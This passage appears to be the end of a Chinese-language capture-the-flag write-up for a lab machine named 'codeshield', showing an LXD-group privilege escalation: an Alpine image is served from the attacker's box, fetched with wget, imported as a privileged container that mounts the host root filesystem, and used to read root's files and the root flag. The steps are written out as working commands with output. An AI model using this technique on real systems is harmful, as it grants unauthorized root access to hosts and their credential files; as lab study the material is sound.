(9/18) Installing ssl_client (1.28.4-r3)
(10/18) Installing zlib (1.2.11-r1)
(11/18) Installing apk-tools (2.10.6-r0)
(12/18) Installing busybox-suid (1.28.4-r3)
(13/18) Installing busybox-initscripts (3.1-r4)
Executing busybox-initscripts-3.1-r4.post-install
(14/18) Installing scanelf (1.2.3-r0)
(15/18) Installing musl-utils (1.1.19-r11)
(16/18) Installing libc-utils (0.7.1-r0)
(17/18) Installing alpine-keys (2.1-r1)
(18/18) Installing alpine-base (3.8.5-r0)
Executing busybox-1.28.4-r3.trigger
OK: 7 MiB in 18 packages

┌──(kali💀kali)-[~/temp/codeshield/lxd-alpine-builder]
└─$ ls -la
total 5848
drwxr-xr-x 3 kali kali    4096 May 30 04:04 .
drwxr-xr-x 5 kali kali    4096 May 30 04:03 ..
-rw-r--r-- 1 kali kali 3259593 May 30 04:03 alpine-v3.13-x86_64-20210218_0139.tar.gz
-rw-r--r-- 1 root root 2674459 May 30 04:04 alpine-v3.8-i686-20250530_0404.tar.gz
-rwxr-xr-x 1 kali kali    8051 May 30 04:04 build-alpine
drwxr-xr-x 8 kali kali    4096 May 30 04:03 .git
-rw-r--r-- 1 kali kali   26530 May 30 04:03 LICENSE
-rw-r--r-- 1 kali kali     768 May 30 04:03 README.md

┌──(kali💀kali)-[~/temp/codeshield/lxd-alpine-builder]
└─$ python3 -m http.server 8888        
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

```bash
# codeshield
earlyp@codeshield:~$ cd /tmp
earlyp@codeshield:/tmp$ wget http://10.0.2.4:8888/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2025-05-30 08:06:48--  http://10.0.2.4:8888/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.0.2.4:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’

alpine-v3.13-x86_64-20210218_0139.tar.gz        100%[====================================================================================================>]   3.11M  --.-KB/s    in 0.07s   

2025-05-30 08:06:48 (42.6 MB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]

earlyp@codeshield:/tmp$ lxc image import ./alpine*.tar.gz --alias myimage
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first container, try: lxc launch ubuntu:22.04
Or for a virtual machine: lxc launch ubuntu:22.04 --vm

Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
earlyp@codeshield:/tmp$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (dir, lvm, zfs, btrfs, ceph, cephobject) [default=zfs]: 
Create a new ZFS pool? (yes/no) [default=yes]: 
Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: 
Size in GiB of the new loop device (1GiB minimum) [default=9GiB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes]: 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 

earlyp@codeshield:/tmp$ 
earlyp@codeshield:/tmp$ lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer
earlyp@codeshield:/tmp$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer
earlyp@codeshield:/tmp$ lxc start mycontainer
earlyp@codeshield:/tmp$ lxc exec mycontainer /bin/sh
~ # whoami;id;pwd
root
uid=0(root) gid=0(root)
/root
~ # ls -la
total 3
drwx------    2 root     root             3 May 30 08:09 .
drwxr-xr-x   19 root     root            19 May 30 08:08 ..
-rw-------    1 root     root            21 May 30 08:09 .ash_history
~ # cd /mnt/root
/mnt/root # ls -la
total 4005969
drwxr-xr-x   19 root     root          4096 Aug 22  2023 .
drwxr-xr-x    3 root     root             3 May 30 08:08 ..
lrwxrwxrwx    1 root     root             7 Aug 10  2023 bin -> usr/bin
drwxr-xr-x    4 root     root          4096 Aug 23  2023 boot
drwxr-xr-x   20 root     root          4240 May 30 06:20 dev
drwxr-xr-x  164 root     root         12288 Aug 30  2023 etc
drwxr-xr-x   14 root     root          4096 Aug 26  2023 home
lrwxrwxrwx    1 root     root             7 Aug 10  2023 lib -> usr/lib
lrwxrwxrwx    1 root     root             9 Aug 10  2023 lib32 -> usr/lib32
lrwxrwxrwx    1 root     root             9 Aug 10  2023 lib64 -> usr/lib64
lrwxrwxrwx    1 root     root            10 Aug 10  2023 libx32 -> usr/libx32
drwx------    2 root     root         16384 Aug 22  2023 lost+found
drwxr-xr-x    3 root     root          4096 May 30 08:07 media
drwxr-xr-x    2 root     root          4096 Aug 10  2023 mnt
drwxr-xr-x    7 root     root          4096 Aug 26  2023 opt
dr-xr-xr-x  368 root     root             0 May 30 06:17 proc
drwx------    9 root     root          4096 Aug 26  2023 root
drwxr-xr-x   50 root     root          1380 May 30 06:51 run
lrwxrwxrwx    1 root     root             8 Aug 10  2023 sbin -> usr/sbin
drwxr-xr-x   12 root     root          4096 Aug 30  2023 snap
drwxr-xr-x    3 root     root          4096 Aug 22  2023 srv
-rw-------    1 root     root     4102029312 Aug 22  2023 swap.img
dr-xr-xr-x   13 root     root             0 May 30 06:17 sys
drwxrwxrwt   25 root     root          4096 May 30 08:09 tmp
drwxr-xr-x   14 root     root          4096 Aug 10  2023 usr
drwxr-xr-x   16 root     root          4096 Aug 26  2023 var
/mnt/root # cd root
/mnt/root/root # ls -la
total 96
drwx------    9 root     root          4096 Aug 26  2023 .
drwxr-xr-x   19 root     root          4096 Aug 22  2023 ..
-rw-------    1 root     root            26 May 30 07:53 .bash_history
-rw-r--r--    1 root     root          3106 Oct 15  2021 .bashrc
drwx------    2 root     root          4096 Aug 28  2023 .cache
drwxr-xr-x    3 root     root          4096 Aug 26  2023 .iredmail
drwx------    3 root     root          4096 Aug 23  2023 .launchpadlib
-rw-------    1 root     root            20 Aug 23  2023 .lesshst
drwxr-xr-x    3 root     root          4096 Aug 22  2023 .local
-r--------    1 root     root            45 Aug 26  2023 .my.cnf
-rw-r--r--    1 root     root            91 Aug 26  2023 .my.cnf-amavisd
-rw-r--r--    1 root     root            92 Aug 26  2023 .my.cnf-fail2ban
-rw-r--r--    1 root     root            93 Aug 26  2023 .my.cnf-iredadmin
-rw-r--r--    1 root     root            91 Aug 26  2023 .my.cnf-iredapd
-rw-r--r--    1 root     root            93 Aug 26  2023 .my.cnf-roundcube
-r--------    1 root     root            89 Aug 26  2023 .my.cnf-vmail
-r--------    1 root     root            94 Aug 26  2023 .my.cnf-vmailadmin
-rw-r--r--    1 root     root           161 Jul  9  2019 .profile
-rw-r--r--    1 root     root            66 Aug 26  2023 .selected_editor
drwx------    2 root     root          4096 Aug 22  2023 .ssh
-rw-r--r--    1 root     root             0 Aug 22  2023 .sudo_as_admin_successful
-rw-r--r--    1 root     root           290 Aug 26  2023 .wget-hsts
drwxr-xr-x    2 root     root          4096 Aug 26  2023 cowrie
-rw-r--r--    1 root     root          2528 Aug 26  2023 root.txt
drwx------    4 root     root          4096 Aug 22  2023 snap
/mnt/root/root # cat root.txt 

             @@@                            
      @@@@@@@@@  @@@@@@                     
 @@@@@@@@@@@@@@          (@@                
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                   
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗             
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║             
  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║             
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝             
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝              
        @@@@@@@   @@@                       
           @@@@@@@                                                           

  _______________________________________________________________________________________________________
 |  _ROOT FLAG!________________________________________________________________________________________  |
 | |                                                                                                   | |
 | | Educate_your_employees_on_password_safety                                                         | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________|
```

同样可以拿到shell！

